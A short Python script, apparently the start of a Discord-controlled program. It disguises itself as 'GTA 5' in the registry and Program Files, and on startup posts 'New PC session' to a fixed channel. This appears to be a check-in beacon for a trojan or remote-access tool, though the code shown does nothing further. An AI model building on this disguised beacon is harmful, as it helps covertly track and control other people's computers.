import discord
import sys
from settings import *


client = discord.Client(intents=discord.Intents.all())

channel_ids = {
    'main': 1114528537093865494
}


software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
software_executable_name = software_registry_name.replace(' ', '') + '.exe'




@client.event 
async def on_ready():  
    await client.get_channel(channel_ids['main']).send('New PC session')

client.run(bot_token)